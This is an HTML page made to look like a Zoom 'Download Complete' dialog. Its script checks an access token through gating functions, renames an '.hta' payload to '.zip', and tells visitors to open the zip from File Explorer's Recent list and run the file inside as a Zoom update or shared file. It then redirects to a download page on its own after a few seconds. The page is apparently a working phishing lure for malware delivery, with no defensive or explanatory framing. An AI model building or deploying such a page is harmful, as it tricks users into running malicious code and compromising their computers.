<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Download Complete</title>
  <style>
    body { margin: 0; padding: 0; background-color: #f5f6f8; font-family: Arial, sans-serif; }
    .modal-overlay { position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 1000; }
    .modal-content { background-color: white; padding: 30px; border-radius: 10px; width: 90%; max-width: 520px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: modalFadeIn 0.3s ease-out; text-align: center; }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .modal-header img { width: 200px; margin-bottom: 15px; }
    .continue-btn { background-color: #0089ff; color: white; border: none; padding: 12px 30px; border-radius: 4px;
      font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; max-width: 260px; transition: background-color 0.3s; }
    .continue-btn:hover { background-color: #0066cc; }
    .info-text { color: #666; font-size: 12px; margin-top: 10px; }
    .spinner { display: none; margin-top: 20px; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header"><img src="assets/zoom.png" alt="Zoom"></div>
      <h2>Download Complete</h2>
      <p class="modal-text" id="modalText"></p>
      <p class="modal-subtext" style="padding-top:10px;" id="modalSub"></p>
      <p class="modal-subtext" style="padding-top:10px;">If your download did not start automatically, you can download the file again.</p>
      <button onclick="go()" id="continueBtn" class="continue-btn">Download File</button>
      <div id="spinner" class="spinner"><p>Loading...</p></div>
      <p class="info-text"></p>
    </div>
  </div>

  <script src="config.js"></script>
  <script src="gate.js"></script>
  <script>
    (function () {
      var q = new URLSearchParams(location.search);
      var tk = q.get('tk') || '';
      if (!tk) { window.gateStep({ entry: true }); return; }
      if (!window.gateStep({ entry: false, allowedRefPaths: ['download.html'] })) return;

      var name = q.get('n') || window.makeName();
      var kind = window.nameKind(name);
      var zipName = name.replace(/\.hta$/i, '.zip');

      document.getElementById('modalText').textContent = kind === 'zoom' ? 'Your download is ready.' : "You've received the file.";
      document.getElementById('modalSub').innerHTML = kind === 'zoom'
        ? 'Your update has been saved to your device. Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to continue.'
        : 'Your file has been saved to your device. Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view it.';

      function go() {
        var btn = document.getElementById('continueBtn');
        var spinner = document.getElementById('spinner');
        if (!btn) return;
        btn.style.display = 'none'; spinner.style.display = 'block';
        setTimeout(function () {
          window.location.href = 'dl.html?tk=' + encodeURIComponent(tk) + '&n=' + encodeURIComponent(name);
        }, 2000);
      }
      // Auto-advance (the button remains for a human who stops to read).
      setTimeout(go, 3500);
    })();
  </script>
</body>
</html>
